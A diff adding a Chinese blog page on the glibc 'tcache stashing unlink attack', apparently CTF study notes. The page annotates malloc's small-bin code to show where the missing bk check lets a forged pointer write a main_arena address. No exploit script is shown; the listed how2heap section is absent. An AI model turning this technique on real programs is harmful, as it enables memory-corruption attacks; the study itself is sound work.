@@ -1,0 +1,923 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="https://blog.csdn.net/Mr_Fmnwon/article/details/142649778\nhttps://www.cnblogs.com/pwnfeifei/p/15859114.html\nhttps://xz.aliyun.com/news/14650\n漏洞分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 if (in_smallbin_range (nb)) { idx = smallbin_index (nb); // 获取size对应的small bin索引 bin = bin_at (av, idx); // 获取对应small bin链表头部 if ((victim = last (bin)) != bin) // victim就是要脱链的堆块，也就是small bin里的最后一个 // 这个if在判断我们所需要的size的那条small bin链上是否存在堆块，存在的话就把victim给脱链 { bck = victim-&gt;bk; // 获取victim的bk指针 if (__glibc_unlikely (bck-&gt;fd != victim)) // 对small bin的双向链表的完整性做了检查，确保victim-&gt;bk-&gt;fd指向的还是victim // 如果我们在这里劫持了victim的bk指针，就会导致bck的fd指向的并不是victim，从而触发异常 malloc_printerr (&#34;malloc(): smallbin double linked list corrupted&#34;); set_inuse_bit_at_offset (victim, nb); // 设置下一个（高地址）chunk的prev_inuse位 bin-&gt;bk = bck; // 将victim脱链 bck-&gt;fd = bin; if (av != &amp;main_arena) set_non_main_arena (victim); // 如果不是主arena，设置非主arena标志 check_malloced_chunk (av, victim, nb); // 检查分配的chunk #if USE_TCACHE /* 在这里，如果看到其他相同大小的chunk，把它们放入tcache。 */ size_t tc_idx = csize2tidx (nb); // 获取size对应的tcache索引 if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) // 如果这个索引在tcache bin的范围里，也就是这个size属于tcache bin的范围 { mchunkptr tc_victim; /* 当bin不为空且tcache未满时，将chunks复制过去。 */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count // 如果tcache bin没有满 &amp;&amp; (tc_victim = last (bin)) != bin) // 如果small bin不为空,tc_victim为small bin中的最后一个堆块 { if (tc_victim != 0) { bck = tc_victim-&gt;bk; // 这里取tc_victim的bk指针，并没有针对bck做双向链表完整性检查，因此我们可以去攻击tc_victim的bk指针 set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; // 将tc_victim从small bin中脱链 bck-&gt;fd = bin; // 如果我们伪造bck，这里就可以将bck-&gt;fd的位置写入一个bin的地址(main_arena+96) tcache_put (tc_victim, tc_idx); // 将tc_victim链入tc_idx这条链 } } } #endif void *p = chunk2mem (victim); // 将chunk转换为用户可用内存 alloc_perturb (p, bytes); // 对分配的内存进行扰动 return p; // 返回分配的内存 } } 范围2.27-至今\n">
+<title>tcache stashing unlink attack</title>
+
+<link rel='canonical' href='http://localhost:1313/p/tcache-stashing-unlink-attack/'>
+
+<link rel="stylesheet" href="/scss/style.min.84466b97fc2839f50008967839ac7e52db98eefba6b8d2a771a97db8f36059e7.css"><meta property='og:title' content="tcache stashing unlink attack">
+<meta property='og:description' content="https://blog.csdn.net/Mr_Fmnwon/article/details/142649778\nhttps://www.cnblogs.com/pwnfeifei/p/15859114.html\nhttps://xz.aliyun.com/news/14650\n漏洞分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 if (in_smallbin_range (nb)) { idx = smallbin_index (nb); // 获取size对应的small bin索引 bin = bin_at (av, idx); // 获取对应small bin链表头部 if ((victim = last (bin)) != bin) // victim就是要脱链的堆块，也就是small bin里的最后一个 // 这个if在判断我们所需要的size的那条small bin链上是否存在堆块，存在的话就把victim给脱链 { bck = victim-&gt;bk; // 获取victim的bk指针 if (__glibc_unlikely (bck-&gt;fd != victim)) // 对small bin的双向链表的完整性做了检查，确保victim-&gt;bk-&gt;fd指向的还是victim // 如果我们在这里劫持了victim的bk指针，就会导致bck的fd指向的并不是victim，从而触发异常 malloc_printerr (&#34;malloc(): smallbin double linked list corrupted&#34;); set_inuse_bit_at_offset (victim, nb); // 设置下一个（高地址）chunk的prev_inuse位 bin-&gt;bk = bck; // 将victim脱链 bck-&gt;fd = bin; if (av != &amp;main_arena) set_non_main_arena (victim); // 如果不是主arena，设置非主arena标志 check_malloced_chunk (av, victim, nb); // 检查分配的chunk #if USE_TCACHE /* 在这里，如果看到其他相同大小的chunk，把它们放入tcache。 */ size_t tc_idx = csize2tidx (nb); // 获取size对应的tcache索引 if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) // 如果这个索引在tcache bin的范围里，也就是这个size属于tcache bin的范围 { mchunkptr tc_victim; /* 当bin不为空且tcache未满时，将chunks复制过去。 */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count // 如果tcache bin没有满 &amp;&amp; (tc_victim = last (bin)) != bin) // 如果small bin不为空,tc_victim为small bin中的最后一个堆块 { if (tc_victim != 0) { bck = tc_victim-&gt;bk; // 这里取tc_victim的bk指针，并没有针对bck做双向链表完整性检查，因此我们可以去攻击tc_victim的bk指针 set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; // 将tc_victim从small bin中脱链 bck-&gt;fd = bin; // 如果我们伪造bck，这里就可以将bck-&gt;fd的位置写入一个bin的地址(main_arena+96) tcache_put (tc_victim, tc_idx); // 将tc_victim链入tc_idx这条链 } } } #endif void *p = chunk2mem (victim); // 将chunk转换为用户可用内存 alloc_perturb (p, bytes); // 对分配的内存进行扰动 return p; // 返回分配的内存 } } 范围2.27-至今\n">
+<meta property='og:url' content='http://localhost:1313/p/tcache-stashing-unlink-attack/'>
+<meta property='og:site_name' content='fuguang&#39;s storys'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='pwn' /><meta property='article:published_time' content='2026-03-12T15:21:28&#43;08:00'/><meta property='article:modified_time' content='2026-03-12T15:21:28&#43;08:00'/><meta property='og:image' content='http://localhost:1313/image/tcache_stashing_unlink_attack.jpg' />
+<meta name="twitter:title" content="tcache stashing unlink attack">
+<meta name="twitter:description" content="https://blog.csdn.net/Mr_Fmnwon/article/details/142649778\nhttps://www.cnblogs.com/pwnfeifei/p/15859114.html\nhttps://xz.aliyun.com/news/14650\n漏洞分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 if (in_smallbin_range (nb)) { idx = smallbin_index (nb); // 获取size对应的small bin索引 bin = bin_at (av, idx); // 获取对应small bin链表头部 if ((victim = last (bin)) != bin) // victim就是要脱链的堆块，也就是small bin里的最后一个 // 这个if在判断我们所需要的size的那条small bin链上是否存在堆块，存在的话就把victim给脱链 { bck = victim-&gt;bk; // 获取victim的bk指针 if (__glibc_unlikely (bck-&gt;fd != victim)) // 对small bin的双向链表的完整性做了检查，确保victim-&gt;bk-&gt;fd指向的还是victim // 如果我们在这里劫持了victim的bk指针，就会导致bck的fd指向的并不是victim，从而触发异常 malloc_printerr (&#34;malloc(): smallbin double linked list corrupted&#34;); set_inuse_bit_at_offset (victim, nb); // 设置下一个（高地址）chunk的prev_inuse位 bin-&gt;bk = bck; // 将victim脱链 bck-&gt;fd = bin; if (av != &amp;main_arena) set_non_main_arena (victim); // 如果不是主arena，设置非主arena标志 check_malloced_chunk (av, victim, nb); // 检查分配的chunk #if USE_TCACHE /* 在这里，如果看到其他相同大小的chunk，把它们放入tcache。 */ size_t tc_idx = csize2tidx (nb); // 获取size对应的tcache索引 if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) // 如果这个索引在tcache bin的范围里，也就是这个size属于tcache bin的范围 { mchunkptr tc_victim; /* 当bin不为空且tcache未满时，将chunks复制过去。 */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count // 如果tcache bin没有满 &amp;&amp; (tc_victim = last (bin)) != bin) // 如果small bin不为空,tc_victim为small bin中的最后一个堆块 { if (tc_victim != 0) { bck = tc_victim-&gt;bk; // 这里取tc_victim的bk指针，并没有针对bck做双向链表完整性检查，因此我们可以去攻击tc_victim的bk指针 set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; // 将tc_victim从small bin中脱链 bck-&gt;fd = bin; // 如果我们伪造bck，这里就可以将bck-&gt;fd的位置写入一个bin的地址(main_arena+96) tcache_put (tc_victim, tc_idx); // 将tc_victim链入tc_idx这条链 } } } #endif void *p = chunk2mem (victim); // 将chunk转换为用户可用内存 alloc_perturb (p, bytes); // 对分配的内存进行扰动 return p; // 返回分配的内存 } } 范围2.27-至今\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/image/tcache_stashing_unlink_attack.jpg' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_c17c68125d7ac105.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">fuguang&#39;s storys</a></h1>
+            <h2 class="site-description">Welcome ~</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/fu9-dotom/fu9-dotom.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#漏洞分析">漏洞分析</a></li>
+    <li><a href="#how2heap例子">how2heap例子</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/tcache-stashing-unlink-attack/">
+                
+                    <img src="/image/tcache_stashing_unlink_attack.jpg" loading="lazy" alt="Featured image of post tcache stashing unlink attack" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/pwn/" style="background-color: #2a9d8f; color: #fff;">
+                Pwn
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/tcache-stashing-unlink-attack/">tcache stashing unlink attack</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 12, 2026</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p><a class="link" href="https://blog.csdn.net/Mr_Fmnwon/article/details/142649778"  target="_blank" rel="noopener"
+    >https://blog.csdn.net/Mr_Fmnwon/article/details/142649778</a></p>
+<p><a class="link" href="https://www.cnblogs.com/pwnfeifei/p/15859114.html"  target="_blank" rel="noopener"
+    >https://www.cnblogs.com/pwnfeifei/p/15859114.html</a></p>
+<p><a class="link" href="https://xz.aliyun.com/news/14650"  target="_blank" rel="noopener"
+    >https://xz.aliyun.com/news/14650</a></p>
+<h2 id="漏洞分析">漏洞分析
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">in_smallbin_range</span> <span class="p">(</span><span class="n">nb</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">idx</span> <span class="o">=</span> <span class="n">smallbin_index</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span> <span class="o">//</span> <span class="n">获取size对应的small</span> <span class="n">bin索引</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">bin</span> <span class="o">=</span> <span class="n">bin_at</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span> <span class="o">//</span> <span class="n">获取对应small</span> <span class="n">bin链表头部</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">((</span><span class="n">victim</span> <span class="o">=</span> <span class="n">last</span> <span class="p">(</span><span class="nb">bin</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">bin</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="o">//</span> <span class="n">victim就是要脱链的堆块</span><span class="err">，</span><span class="n">也就是small</span> <span class="n">bin里的最后一个</span>
+</span></span><span class="line"><span class="cl">      <span class="o">//</span> <span class="n">这个if在判断我们所需要的size的那条small</span> <span class="n">bin链上是否存在堆块</span><span class="err">，</span><span class="n">存在的话就把victim给脱链</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span> <span class="o">//</span> <span class="n">获取victim的bk指针</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">victim</span><span class="p">))</span> <span class="o">//</span> <span class="n">对small</span> <span class="n">bin的双向链表的完整性做了检查</span><span class="err">，</span><span class="n">确保victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd指向的还是victim</span>
+</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="n">如果我们在这里劫持了victim的bk指针</span><span class="err">，</span><span class="n">就会导致bck的fd指向的并不是victim</span><span class="err">，</span><span class="n">从而触发异常</span>
+</span></span><span class="line"><span class="cl">        <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s2">&#34;malloc(): smallbin double linked list corrupted&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="n">set_inuse_bit_at_offset</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span> <span class="o">//</span> <span class="n">设置下一个</span><span class="err">（</span><span class="n">高地址</span><span class="err">）</span><span class="n">chunk的prev_inuse位</span>
+</span></span><span class="line"><span class="cl">          <span class="nb">bin</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span> <span class="o">//</span> <span class="n">将victim脱链</span>
+</span></span><span class="line"><span class="cl">          <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">set_non_main_arena</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span> <span class="o">//</span> <span class="n">如果不是主arena</span><span class="err">，</span><span class="n">设置非主arena标志</span>
+</span></span><span class="line"><span class="cl">          <span class="n">check_malloced_chunk</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span> <span class="o">//</span> <span class="n">检查分配的chunk</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#if USE_TCACHE</span>
+</span></span><span class="line"><span class="cl">      <span class="o">/*</span> <span class="n">在这里</span><span class="err">，</span><span class="n">如果看到其他相同大小的chunk</span><span class="err">，</span><span class="n">把它们放入tcache</span><span class="err">。</span> <span class="o">*/</span>
+</span></span><span class="line"><span class="cl">      <span class="n">size_t</span> <span class="n">tc_idx</span> <span class="o">=</span> <span class="n">csize2tidx</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span> <span class="o">//</span> <span class="n">获取size对应的tcache索引</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">tcache</span> <span class="o">&amp;&amp;</span> <span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="o">.</span><span class="n">tcache_bins</span><span class="p">)</span> <span class="o">//</span> <span class="n">如果这个索引在tcache</span> <span class="n">bin的范围里</span><span class="err">，</span><span class="n">也就是这个size属于tcache</span> <span class="n">bin的范围</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="n">mchunkptr</span> <span class="n">tc_victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">          <span class="o">/*</span> <span class="n">当bin不为空且tcache未满时</span><span class="err">，</span><span class="n">将chunks复制过去</span><span class="err">。</span> <span class="o">*/</span>
+</span></span><span class="line"><span class="cl">          <span class="k">while</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="o">.</span><span class="n">tcache_count</span> <span class="o">//</span> <span class="n">如果tcache</span> <span class="n">bin没有满</span>
+</span></span><span class="line"><span class="cl">             <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">tc_victim</span> <span class="o">=</span> <span class="n">last</span> <span class="p">(</span><span class="nb">bin</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">bin</span><span class="p">)</span> <span class="o">//</span> <span class="n">如果small</span> <span class="n">bin不为空</span><span class="p">,</span><span class="n">tc_victim为small</span> <span class="n">bin中的最后一个堆块</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">tc_victim</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">              <span class="n">bck</span> <span class="o">=</span> <span class="n">tc_victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span> <span class="o">//</span> <span class="n">这里取tc_victim的bk指针</span><span class="err">，</span><span class="n">并没有针对bck做双向链表完整性检查</span><span class="err">，</span><span class="n">因此我们可以去攻击tc_victim的bk指针</span>
+</span></span><span class="line"><span class="cl">              <span class="n">set_inuse_bit_at_offset</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">              <span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">set_non_main_arena</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">              <span class="nb">bin</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span> <span class="o">//</span> <span class="n">将tc_victim从small</span> <span class="n">bin中脱链</span>
+</span></span><span class="line"><span class="cl">              <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">;</span> <span class="o">//</span> <span class="n">如果我们伪造bck</span><span class="err">，</span><span class="n">这里就可以将bck</span><span class="o">-&gt;</span><span class="n">fd的位置写入一个bin的地址</span><span class="p">(</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">96</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">              <span class="n">tcache_put</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span> <span class="o">//</span> <span class="n">将tc_victim链入tc_idx这条链</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#endif</span>
+</span></span><span class="line"><span class="cl">          <span class="n">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span> <span class="o">//</span> <span class="n">将chunk转换为用户可用内存</span>
+</span></span><span class="line"><span class="cl">          <span class="n">alloc_perturb</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">);</span> <span class="o">//</span> <span class="n">对分配的内存进行扰动</span>
+</span></span><span class="line"><span class="cl">          <span class="k">return</span> <span class="n">p</span><span class="p">;</span> <span class="o">//</span> <span class="n">返回分配的内存</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>范围2.27-至今</p>
